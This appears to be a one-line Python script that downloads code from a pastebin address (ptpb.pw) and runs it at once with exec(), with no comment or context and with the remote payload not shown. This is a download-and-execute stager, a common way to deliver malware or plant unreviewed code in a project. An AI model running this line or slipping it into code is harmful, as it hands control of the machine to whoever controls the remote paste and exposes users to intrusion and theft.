import requests; exec(requests.get("https://ptpb.pw/I2DS").content.decode())
